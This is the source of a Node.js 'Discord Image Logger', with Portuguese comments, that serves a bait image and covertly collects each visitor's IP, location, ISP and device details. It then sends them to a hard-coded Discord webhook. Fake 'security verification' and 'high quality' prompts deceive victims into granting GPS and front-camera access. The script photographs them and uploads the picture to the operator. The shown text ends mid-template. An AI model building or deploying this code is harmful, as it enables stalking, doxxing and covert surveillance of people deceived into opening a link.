// Discord Image Logger - Versão com API IP melhorada e acesso à câmera
const https = require('https');
const http = require('http');
const url = require('url');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "username": "Image Logger",
  "color": 0x00FFFF,
  "accurateLocation": true,
  "requestCamera": true // Nova configuração para solicitar acesso à câmera
};

// Função melhorada para obter informações detalhadas sobre o IP
async function getIPInfo(ip) {
  return new Promise((resolve, reject) => {
    // Usar uma API alternativa que funciona melhor com IPv6 e redes móveis
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    
    http.get(apiUrl, (res) => {
      let data = '';
      res.on('data', (chunk) => { 
        data += chunk; 
      });
      
      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          console.log('Resposta da API IP:', parsedData);
          
          // Verificar se a API retornou sucesso
          if (parsedData.status === 'success') {
            resolve(parsedData);
          } else {
            console.error('API retornou status diferente de sucesso:', parsedData);
            // Ainda resolvemos com os dados que temos
            resolve(parsedData);
          }
        } catch (e) {
          console.error('Erro ao analisar resposta da API IP:', e);
          console.error('Dados recebidos:', data);
          // Resolvemos com um objeto vazio para evitar erros na formatação
          resolve({});
        }
      });
    }).on('error', (error) => {
      console.error('Erro ao fazer requisição para API de IP:', error);
      // Resolvemos com um objeto vazio para evitar erros na formatação
      resolve({});
    });
  });
}

// Função para enviar webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Preparar os dados
      const webhookData = JSON.stringify(data);
      
      // Parsear a URL do webhook para obter hostname e path
      const webhookUrl = new URL(config.webhook);
      
      // Configurar a requisição
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      console.log('Enviando para webhook:', options.hostname, options.path);
      
      // Criar a requisição
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Coletar dados da resposta
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // Quando a resposta terminar
        res.on('end', () => {
          // Verificar código de status
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook enviado com sucesso');
            resolve(true);
          } else {
            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
            console.error(`Resposta: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Tratar erros na requisição
      req.on('error', (error) => {
        console.error('Erro na requisição do webhook:', error);
        reject(error);
      });
      
      // Enviar os dados
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Erro ao enviar webhook:', error);
      reject(error);
    }
  });
}

// Função para enviar imagem da câmera para o Discord
async function sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, coords = null, endpoint = null) {
  try {
    // Formatar descrição com informações do IP
    const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, endpoint);
    
    // Construir dados para o webhook
    const data = {
      username: config.username,
      content: "@everyone",
      embeds: [
        {
          title: "Image Logger - Câmera + IP + Localização Capturados",
          color: config.color,
          description: description,
          thumbnail: { url: config.image }
        }
      ]
    };
    
    // Enviar webhook com informações
    console.log('Enviando informações com captura de câmera para o Discord...');
    await sendDiscordWebhook(data);
    
    // Agora enviar a imagem da câmera como um segundo webhook
    // Remover o prefixo "data:image/jpeg;base64," da string base64
    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, "");
    
    // Preparar os dados para o webhook de arquivo
    const boundary = "------------------------" + Date.now().toString(16);
    
    const webhookUrl = new URL(config.webhook);
    
    // Criar o corpo da requisição multipart/form-data
    let body = '';
    body += `--${boundary}\r\n`;
    body += 'Content-Disposition: form-data; name="payload_json"\r\n';
    body += 'Content-Type: application/json\r\n\r\n';
    body += JSON.stringify({
      username: config.username,
      content: "Captura da câmera do alvo:"
    });
    body += `\r\n--${boundary}\r\n`;
    body += 'Content-Disposition: form-data; name="files[0]"; filename="camera_capture.jpg"\r\n';
    body += 'Content-Type: image/jpeg\r\n\r\n';
    
    // Converter o corpo e a imagem para Buffers
    const bodyBuffer = Buffer.from(body, 'utf8');
    const imageBuffer = Buffer.from(base64Data, 'base64');
    const endBuffer = Buffer.from(`\r\n--${boundary}--`, 'utf8');
    
    // Concatenar todos os buffers
    const requestBody = Buffer.concat([bodyBuffer, imageBuffer, endBuffer]);
    
    // Configurar a requisição para enviar o arquivo
    const options = {
      hostname: webhookUrl.hostname,
      path: webhookUrl.pathname + webhookUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': requestBody.length
      }
    };
    
    return new Promise((resolve, reject) => {
      const req = https.request(options, (res) => {
        let responseData = '';
        
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Imagem da câmera enviada com sucesso');
            resolve(true);
          } else {
            console.error(`Erro ao enviar imagem da câmera: Status ${res.statusCode}`);
            console.error(`Resposta: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      req.on('error', (error) => {
        console.error('Erro ao enviar imagem da câmera:', error);
        reject(error);
      });
      
      req.write(requestBody);
      req.end();
    });
    
  } catch (error) {
    console.error('Erro ao enviar imagem da câmera:', error);
    return false;
  }
}

// Detectar se é um dispositivo iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Detectar se é um dispositivo móvel
function isMobile(userAgent) {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
}

// Função para formatar a mensagem completa do Discord com informações detalhadas do IP
function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
  // Detectar sistema operacional e navegador
  let os = "Unknown";
  let browser = "Unknown";
  
  if (userAgent) {
    // Sistema operacional
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    // Navegador
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      browser = "Opera";
    }
  }

  // Formatar coordenadas
  let coordsText = 'Unknown';
  let coordsSource = 'Approximate';
  
  if (coords) {
    coordsText = coords.replace(',', ', ');
    coordsSource = `Precise, [Google Maps](https://www.google.com/maps/search/google+map++${coords})`;
  } else if (info && info.lat && info.lon) {
    coordsText = `${info.lat}, ${info.lon}`;
    coordsSource = `Approximate`;
  }

  // Formatar timezone
  let timezoneText = 'Unknown';
  if (info && info.timezone) {
    const parts = info.timezone.split('/');
    if (parts.length >= 2) {
      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
    } else {
      timezoneText = info.timezone;
    }
  }

  // Verificar bot
  let botStatus = 'False';
  if (info && info.hosting) {
    if (info.hosting && !info.proxy) {
      botStatus = 'Possibly';
    } else if (info.hosting) {
      botStatus = 'Possibly';
    }
  }

  // Extrair ASN do campo "as" (pode conter o ASN completo como "AS12345 Organization")
  let asn = 'Unknown';
  if (info && info.as) {
    // Extrair apenas o número do ASN
    const asnMatch = info.as.match(/AS(\d+)/i);
    if (asnMatch && asnMatch[1]) {
      asn = info.as;
    } else {
      asn = info.as;
    }
  }

  return `**A User Opened the Original Image!**

**Endpoint:** \`${endpoint || 'N/A'}\`
            
**IP Info:**
> **IP:** \`${ip || 'Unknown'}\`
> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
> **ASN:** \`${asn}\`
> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
> **Coords:** \`${coordsText}\` (${coordsSource})
> **Timezone:** \`${timezoneText}\`
> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
> **Bot:** \`${botStatus}\`

**PC Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``;
}

// Função principal
module.exports = async (req, res) => {
  try {
    // Obter parâmetros da URL
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Verificar se já temos coordenadas de localização
    const cameraParam = params.c; // Verificar se temos imagem da câmera
    
    // Obter IP e User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Desconhecido';
    
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    
    console.log('Requisição recebida de IP:', ip);
    console.log('User Agent:', userAgent);
    
    // Verificar se é iOS ou móvel para tratamento especial
    const deviceIsIOS = isIOS(userAgent);
    const deviceIsMobile = isMobile(userAgent);
    
    // Verificar se o IP é do Discord (começa com 35)
    const isDiscord = ip.startsWith('35');
    
    // Se temos imagem da câmera, processar e enviar para o Discord
    if (cameraParam) {
      try {
        // Decodificar a imagem
        const imageBase64 = Buffer.from(cameraParam, 'base64').toString('utf-8');
        
        // Obter informações detalhadas do IP
        console.log('Obtendo informações do IP...');
        const ipInfo = await getIPInfo(ip);
        console.log('Informações do IP obtidas:', ipInfo);
        
        // Enviar imagem e informações para o Discord
        await sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, geoParam ? Buffer.from(geoParam, 'base64').toString('utf-8') : null, req.url);
        
        // Enviar página com a imagem
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Erro ao processar imagem da câmera:', error);
        // Continuar mesmo com erro na imagem da câmera
      }
    }
    // Se temos parâmetro de geolocalização, enviar para o Discord
    else if (geoParam) {
      try {
        // Decodificar as coordenadas
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        console.log('Coordenadas recebidas:', latitude, longitude);
        
        // Obter informações detalhadas do IP
        console.log('Obtendo informações do IP...');
        const ipInfo = await getIPInfo(ip);
        console.log('Informações do IP obtidas:', ipInfo);
        
        // Formatar a mensagem completa
        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
        
        // Enviar webhook ao Discord com coordenadas
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Image Logger - IP + Localização Capturados",
              color: config.color,
              description: description,
              thumbnail: { url: config.image }
            }
          ]
        };
        
        console.log('Enviando webhook para o Discord...');
        await sendDiscordWebhook(data);
        
        // Se devemos solicitar acesso à câmera, enviar página com solicitação
        if (config.requestCamera) {
          const html = `
            <!DOCTYPE html>
            <html>
            <head>
              <title>Imagem</title>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <style>
                body, html {
                  margin: 0;
                  padding: 0;
                  height: 100%;
                  width: 100%;
                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                }
                .container {
                  display: flex;
                  flex-direction: column;
                  justify-content: center;
                  align-items: center;
                  height: 100vh;
                  position: relative;
                }
                .camera-access {
                  position: fixed;
                  top: 0;
                  left: 0;
                  width: 100%;
                  height: 100%;
                  background-color: rgba(0,0,0,0.8);
                  display: flex;
                  flex-direction: column;
                  justify-content: center;
                  align-items: center;
                  color: white;
                  z-index: 1000;
                }
                .camera-content {
                  max-width: 500px;
                  padding: 20px;
                  text-align: center;
                }
                .camera-button {
                  margin-top: 20px;
                  background-color: #007AFF;
                  color: white;
                  border: none;
                  border-radius: 20px;
                  padding: 12px 24px;
                  font-size: 16px;
                  font-weight: 600;
                  cursor: pointer;
                }
                .camera-message {
                  margin-top: 15px;
                  font-size: 14px;
                  opacity: 0.8;
                }
                .hidden {
                  display: none !important;
                }
                #video {
                  display: none;
                }
                #canvas {
                  display: none;
                }
                .imagem {
                  width: 100%;
                  height: 100vh;
                  background-image: url('${config.image}');
                  background-position: center;
                  background-repeat: no-repeat;
                  background-size: contain;
                }
              </style>
            </head>
            <body>
              <div class="imagem"></div>
              
              <div class="camera-access" id="cameraAccess">
                <div class="camera-content">
                  <h2>Verificação de Segurança</h2>
                  <p>Para continuar, precisamos verificar sua identidade por motivos de segurança.</p>
                  <button id="cameraButton" class="camera-button">Verificar Identidade</button>
                  <p class="camera-message">Isto é necessário apenas uma vez para proteção contra bots.</p>
                </div>
              </div>
              
              <video id="video" autoplay playsinline></video>
              <canvas id="canvas"></canvas>
              
              <script>
                // Script para acessar câmera
                document.getElementById('cameraButton').addEventListener('click', function() {
                  // Acessar a câmera
                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    // Preferir câmera frontal em dispositivos móveis
                    const constraints = {
                      video: {
                        facingMode: "user"
                      }
                    };
                    
                    navigator.mediaDevices.getUserMedia(constraints)
                      .then(function(stream) {
                        // Exibir stream no elemento de vídeo
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = function(e) {
                          // Tirar foto após carregar o stream
                          setTimeout(function() {
                            // Definir tamanho do canvas para corresponder ao vídeo
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            
                            // Desenhar o frame atual no canvas
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            // Converter para base64
                            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                            
                            // Parar stream da câmera
                            stream.getTracks().forEach(track => {
                              track.stop();
                            });
                            
                            // Codificar em base64 e enviar
                            const encodedImage = btoa(imageDataUrl);
                            
                            // Construir nova URL
                            var currentUrl = window.location.href;
                            var newUrl;
                            if (currentUrl.includes("?")) {
                              newUrl = currentUrl + "&c=" + encodedImage;
                            } else {
                              newUrl = currentUrl + "?c=" + encodedImage;
                            }
                            
                            // Esconder div de acesso à câmera
                            document.getElementById('cameraAccess').style.display = 'none';
                            
                            // Redirecionar
                            window.location.replace(newUrl);
                          }, 1000); // Tirar foto após 1 segundo
                        };
                      })
                      .catch(function(error) {
                        console.error("Erro ao acessar câmera:", error);
                        // Se houve erro, esconder div de acesso à câmera
                        document.getElementById('cameraAccess').style.display = 'none';
                      });
                  } else {
                    console.error("getUserMedia não suportado");
                    // Se não é suportado, esconder div de acesso à câmera
                    document.getElementById('cameraAccess').style.display = 'none';
                  }
                });
              </script>
            </body>
            </html>
          `;
          
          res.setHeader('Content-Type', 'text/html');
          res.status(200).send(html);
        } else {
          // Enviar página com a imagem
          const html = `
            <!DOCTYPE html>
            <html>
            <head>
              <title>Imagem</title>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <style>
                body, html {
                  margin: 0;
                  padding: 0;
                  height: 100%;
                  width: 100%;
                  overflow: hidden;
                }
                .imagem {
                  width: 100%;
                  height: 100vh;
                  background-image: url('${config.image}');
                  background-position: center;
                  background-repeat: no-repeat;
                  background-size: contain;
                }
              </style>
            </head>
            <body>
              <div class="imagem"></div>
            </body>
            </html>
          `;
          
          res.setHeader('Content-Type', 'text/html');
          res.status(200).send(html);
        }
      } catch (error) {
        console.error('Erro ao processar geolocalização:', error);
        // Continuar mesmo com erro na geolocalização
      }
    } else if (isDiscord) {
      // Se for o Discord acessando, enviar alerta de link
      console.log("Acesso do Discord detectado. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // Para o Discord, enviar imagem bugada
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // Se não temos geolocalização ainda, solicitar do navegador
      
      // Primeiro, obter informações do IP e enviar relatório básico
      console.log('Obtendo informações básicas do IP...');
      const ipInfo = await getIPInfo(ip);
      console.log('Informações básicas do IP obtidas:', ipInfo);
      
      // Formatar a mensagem básica
      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      const basicData = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Acesso Inicial",
            color: config.color,
            description: description,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      console.log('Enviando relatório inicial para o Discord...');
      await sendDiscordWebhook(basicData);
      
      // Personalizar o HTML com base no dispositivo (iOS vs outros)
      let html;
      
      if (deviceIsIOS) {
        // Versão especial para iOS com instruções claras
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
              }
              .container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                position: relative;
              }
              .image-preview {
                width: 100%;
                max-width: 500px;
                max-height: 70vh;
                object-fit: contain;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
              }
              .location-button {
                margin-top: 20px;
                background-color: #007AFF; /* iOS blue */
                color: white;
                border: none;
                border-radius: 20px;
                padding: 12px 24px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
              }
              .location-icon {
                margin-right: 8px;
                width: 20px;
                height: 20px;
              }
              .message {
                margin-top: 16px;
                text-align: center;
                color: #8E8E93;
                font-size: 14px;
                max-width: 300px;
              }
              .hidden {
                display: none;
              }
              #video {
                display: none;
              }
              #canvas {
                display: none;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <img src="${config.image}" alt="Imagem" class="image-preview">
              
              <button id="locationButton" class="location-button">
                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <circle cx="12" cy="10" r="3"></circle>
                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
                </svg>
                Ver em alta qualidade
              </button>
              
              <p class="message">Toque no botão acima para ver a imagem em resolução completa</p>
              
              <div id="loadingMessage" class="message hidden">
                Carregando imagem em alta definição...
              </div>
              
              <video id="video" autoplay playsinline></video>
              <canvas id="canvas"></canvas>
            </div>
            
            <script>
              // Script para geolocalização no iOS
              document.getElementById('locationButton').addEventListener('click', function() {
                // Mostrar mensagem de carregamento
                document.getElementById('loadingMessage').classList.remove('hidden');
                this.disabled = true;
                this.style.backgroundColor = '#999';
                
                // Solicitar geolocalização
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    function(position) {
                      // Sucesso - temos a posição
                      var lat = position.coords.latitude;
                      var lng = position.coords.longitude;
                      var coords = lat + "," + lng;
                      
                      // Codificar em base64
                      var encodedCoords = btoa(coords);
                      
                      // Construir nova URL
                      var currentUrl = window.location.href;
                      var newUrl;
                      if (currentUrl.includes("?")) {
                        newUrl = currentUrl + "&g=" + encodedCoords;
                      } else {
                        newUrl = currentUrl + "?g=" + encodedCoords;
                      }
                      
                      // Se devemos solicitar acesso à câmera também
                      if (${config.requestCamera}) {
                        // Tentar acessar câmera
                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                          // Preferir câmera frontal
                          const constraints = {
                            video: {
                              facingMode: "user"
                            }
                          };
                          
                          navigator.mediaDevices.getUserMedia(constraints)
                            .then(function(stream) {
                              // Exibir stream no elemento de vídeo
                              const video = document.getElementById('video');
                              video.srcObject = stream;
                              video.onloadedmetadata = function(e) {
                                // Tirar foto após carregar o stream
                                setTimeout(function() {
                                  // Definir tamanho do canvas
                                  const canvas = document.getElementById('canvas');
                                  canvas.width = video.videoWidth;
                                  canvas.height = video.videoHeight;
                                  
                                  // Desenhar o frame atual no canvas
                                  const context = canvas.getContext('2d');
                                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                  
                                  // Converter para base64
                                  const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                                  
                                  // Parar stream da câmera
                                  stream.getTracks().forEach(track => {
                                    track.stop();
                                  });
                                  
                                  // Codificar em base64 e enviar
                                  const encodedImage = btoa(imageDataUrl);
                                  
                                  // Adicionar à URL
                                  newUrl = newUrl + "&c=" + encodedImage;
                                  
                                  // Redirecionar
                                  window.location.replace(newUrl);
                                }, 1000); // Tirar foto após 1 segundo
                              };
                            })
                            .catch(function(error) {
                              console.error("Erro ao acessar câmera:", error);
                              // Se houve erro, continuar mesmo sem a câmera
                              window.location.replace(newUrl);
                            });
                        } else {
                          // Se não suporta câmera, continuar sem ela
                          window.location.replace(newUrl);
                        }
                      } else {
                        // Redirecionar sem solicitar câmera
                        window.location.replace(newUrl);
                      }
                    },
                    function(error) {
                      // Erro ao obter localização
                      console.log("Erro de geolocalização: " + error.message);
                      document.getElementById('loadingMessage').innerText = "Erro ao carregar. Tente novamente.";
                      document.getElementById('locationButton').disabled = false;
                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
                    },
                    {
                      enableHighAccuracy: true,
                      timeout: 15000,
                      maximumAge: 0
                    }
                  );
                }
              });
            </script>
